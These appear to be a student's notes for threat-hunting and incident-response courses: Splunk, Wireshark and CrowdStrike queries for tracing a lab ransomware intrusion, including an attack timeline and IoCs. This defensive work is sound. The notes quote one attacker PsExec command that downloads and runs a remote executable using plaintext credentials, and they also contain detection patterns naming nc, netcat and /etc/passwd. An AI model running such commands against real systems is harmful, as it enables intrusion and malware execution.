# TH-200

## Hunting With Network Data

Searches through all indexed data, specifically looking for events originating from a specific hostname > identifies the top 20 destination IP addresses associated with them.

`index="*" SourceHostname="CLIENT2.megacorpone.com"| top limit=20 DestinationIp`

Generate a table that maps our malicious IP against the running process on CLIENT02:

`index="*" DestinationIp="192.229.211.108"  User="MEGACORPONE\\e.taylor" | table _time,Image,ProcessId`

Filter network events related to a domain user and being sent to TCP port 80

`index="*" DestinationPort=80 User="MEGACORPONE\\e.taylor"`

## WireShark

`ip.addr == 192.229.211.108 and ip.addr ==  10.25.25.101`

Various malware and ransomware usually perform local network scanning and enumeration before deciding what actions to take. The initial local network scan is often performed through Address Resolution Protocol (ARP) before conducting extra enumeration.

Filter any ARP traffic originated by CLIENT02 + include SMB traffic

`(arp.src.proto_ipv4 == 10.25.25.101) or smb`

## Hunting on Endpoints

Display all events that contain strings consisting the the `.nmh` file extension.

`index="*" "*.nmh"`

`index="*" "akira" NOT "akira_readme.txt"`

File creation events with a Sysmon ID 11 (FileCreate) records both file creations and overwrites.

Depending on how the ransomware performs the file encryption process, Sysmon might not generate a new FileCreate event when a `.nmh` file is created. For instance, if the ransomware replaces the file contents (or only parts of it) and renames it to the `.nmh` file extension, no event is generated as this is not a file creation or an "overwrite" that would cause Sysmon to generate a FileCreate event. To capture such ransomware activities, we'd need to supplement our monitoring process with additional solutions or audit policies.

Search all indices for occurrences of the file hash 

`index="*" "637E28B38086FF9EFD1606805FF57AAF6CDEC4537378F019D6070A5EFDC9C983"`

Hunt for occurrences of these names

`index="*" ("l9k1JEYlHZ.exe" OR "image_slider.exe" OR "db_update.exe")`

Hunt for the C&C IP address,

`index="*" 192.168.50.63`

`index="*" host="CLIENT4" "192.168.50.63" | reverse`

`host="CLIENT4" (index="windows_powershell") OR (index="windows_sysmon" FileCreate) OR (index="windows_sysmon" ProcessCreate)`

`index="*" "healthcheck.exe"`

`index="*" host="CLIENT4" "Invoke-Bloodhound"`

The Windows Security log records account logons under event 4624. This is generated when a logon session is created on the local or destination machine and contains a variety of information such as the account that was used to authenticate, the source IP for network logons, and the logon type.

In Windows security, particularly for event ID 4624, "logon" and "login" are often used interchangeably to describe user authentication to a system. However, "login" is a broader term for accessing systems or services, while "logon" specifically refers to starting a user session in the Windows environment.

Search for 4624 events in the Windows Security log. Specifically exclude events originating from the domain controller DC1 due to its role as a central authentication point. => Focus on RDP logins to domain computers.

While we exclude DC1 from this search, we should confirm later that the threat actor did not perform lateral movement activities to or from the domain controller.

`index="*" sourcetype="WinEventLog:Security" EventCode=4624 "h.johnson" NOT host="DC1"`

The logon type for the first event is 3 (Network) and the other 2 events have the logon type 10 (RemoteInteractive). This is typical for scenarios in which a user initiates an RDP connection to a Windows machine, where first, the network credentials are validated (type 3), followed by the establishment of a remote interactive session (type 10).

```
Timeline:
8:05:03 PM - Execution of l9k1JEYlHZ.exe on CLIENT3
8:04.59 PM - Download l9k1JEYlHZ.exe from 192.168.50.63 on CLIENT3
7:55:14 PM - File image_slider.exe deleted on CLIENT5
7:01:25 PM - File Transfer of the BloodHound Archive using scp to 192.168.50.63
6:57:58 PM - Execution of Invoke-BloodHound on CLIENT4
6:56:50 PM - Download of SharpHound PowerShell Collector from 192.168.50.63 on CLIENT4
6:55:14 PM - Execution of healthcheck.exe (Mimikatz) on CLIENT4
6:51:50 PM to 6:51:58 PM - Using Microsoft Edge to browse web server on 192.168.50.63

Threat Actor's Tools:
637E28B38086FF9EFD1606805FF57AAF6CDEC4537378F019D6070A5EFDC9C983 - db_update.exe (DB1), image_slider.exe (CLIENT5) and l9k1JEYlHZ.exe (CLIENT3)
3c92bfc71004340ebc00146ced294bc94f49f6a5e212016ac05e7d10fcb3312c - l9k1JEYlHZ.exe (FILE1)

Network IoCs:
192.168.50.63 
```

## Threat Hunting Without IoCs

Displays all registered scheduled tasks and groups them by their aid (Agent Identifier). To show the human-readable DNS name of the machine instead of the identifier, let's replace aid with ComputerName:

Explore activities related to scheduled tasks, such as modifications and deletions, According to the documentation, the CQL also includes other simpleNames such as ScheduledTaskDeleted or ScheduledTaskModified.

```
#event_simpleName=ScheduledTask*
| groupBy([ComputerName, TaskName, TaskExecCommand, TaskAuthor], limit=max)
```

```
#event_simpleName=ScheduledTask*
| TaskExecCommand = "C:\\Users\\e.taylor\\fin/6.exe"
```

Uncover all events associated with the filenames `6.exe` and `432.lnk`, excluding any occurrences from CLIENT2.

```
#event_simpleName=ProcessRollup2 OR #event_simpleName=SyntheticProcessRollup2
| ComputerName != CLIENT2
| CommandLine = /6.exe/i OR CommandLine = /432.lnk/i
```

Search for network communications to `webdav.4shared.com` and `cohodl.com` (from the identified username).

```
("webdav.4shared.com") or ("cohodl.com")
```

Search for any instances of scheduled tasks with the names WindowsUpdate or UpdateHealthCheck across all systems, excluding CLIENT2.

```
#event_simpleName=ScheduledTask*
| ComputerName != CLIENT2
| TaskName = WindowsUpdate OR TaskName = UpdateHealthCheck
```

Hunt for events containing the username or password that were used in the authentication to the WebDAV share.

```
("lasex69621@cohodl.com") or ("dE}9tBDaFK'Y%uv")
```

# IR-200

Detect password spraying attacks

`host="dc01" "EventCode=4625"`

**Script Block Logging** records the input and output of script blocks executed in PowerShell. **Script Block Logging** events are collected in the index **windows_powershell**.

Search for events related to password spraying => Commands or tools used to perform the attack if those actions were performed via PowerShell. 

`index="windows_powershell" host="CLIENT01"`

Search the **Windows Defender Operational** log and the event ID 1116 which is used to record the detection of malware.

`index="windows_defender" "EventCode=1116"`

Analyzing the data of the **windows_sysmon** index to understand how the malicious binaries were transferred to the internal machines

`index="windows_sysmon" host="CLIENT01"`

Since we know that the scheduled task was identified by analyzing the PowerShell history, search the PowerShell Operational log that contains events recorded by **Script Block Logging**. 3 commands that can be used in PowerShell to create a scheduled task: `Register-ScheduledTask` Cmdlet, `schtasks.exe`, and `at.exe`.

`index="windows_powershell" host="CLIENT01" ("Register-ScheduledTask" OR "schtasks.exe" OR "at.exe")`

The post contained the filename `dump.db`. Since the database was dumped from a Confluence service, limit the potentially-infected systems to WEB01.

Search for all events containing the string `*.db` for the host WEB01. If the database is exfiltrated without renaming, it should have this file extension.

`host="web01" "*.db"`

Search query for the ShellShock alert. On host WEB01, the `other_vhosts_access.log` file is searched for log entries related to access requests that contain references to any files with the `.cgi` extension.

`host="web01" source="/var/log/apache2/other_vhosts_access.log" "*.cgi"`

Search the index **windows_sysmon** for events containing the string Bloodhound on the host FILE01.

`index="windows_sysmon" host="FILE01" "BloodHound"`

`:Zone.Identifier` at the end of the file name is metadata and used by the Attachment Execution Service in Windows, indicating where the file originated from. The main objective is to protect users from running malicious files downloaded from locations such as the internet.

Find out who or in which user context the domain enumeration was performed.

Search the **windows_powershell** index to potentially find PowerShell commands or script blocks related to the SharpHound collector usage.

`index="windows_powershell" host="FILE01"`

The event contains the information that runas was used to create a PowerShell session as domain user TECH\l.martin. This explains why the local administrator account was recorded performing the domain enumeration

`runas /netonly /user:TECH\l.martin "powershell.exe -ep bypass"`

Windows Defender Quarantine

`index="windows_defender" "EventCode=1160"`

Search for SQLi

`index=websrv_logs "SELECT" AND ("UNION ALL" OR "1=1" OR "--" OR "/*")`

Deserialization exploits because Confluence is developed in Java. For code injection payloads, we'll use `*bash*, *sh*, *nc*, and *netcat*`, as these programs are typically involved to execute commands in web-based exploits. For directory traversal attacks, we'll use `id_*` to search for the extraction of SSH private keys, and `/etc/*` for configuration files such as `/etc/passwd`.

Web-based exploits have several formatting limitations, such as whitespaces and other special characters. To use commands such as bash -c "whoami", attackers commonly URL encode them. The URL-encoded representation of above command would be `bash%20-c%20%22whoami%22`.
Let's adjust the remote code execution part of our search query to `*bash%20*, *sh%20*, *nc%20*, and *netcat%20*`, since an attacker would most likely want to issue a whitespace (URL encoded as %20) after these programs.

`host="web01" source="/var/log/apache2/other_vhosts_access.log" ("*bash%20*" OR "*sh%20*" OR "*nc%20*" OR "*netcat%20*" OR "id_*" OR "/etc/*")`

The attacker downloaded the PowerShell script `DomainPasswordSpray.ps1` from the IP address 192.168.48.130.

`index="windows_powershell" host="CLIENT01" "192.168.48.130"`

```pwsh
.\PsExec64.exe -accepteula -i \\FILE01 -u TECH\SVCFILE01 -p "Querty09!" cmd /c powershell -Command "& {$client = New-Object System.Net.WebClient; $client.DownloadFile('http://192.168.48.130/application_builder.exe', 'C:\Windows\Tasks\updater.exe'); Start-Process 'C:\Windows\Tasks\updater.exe'}"
```

The Windows Logs are contained in the index **main**,

`index="main" host="FILE01"`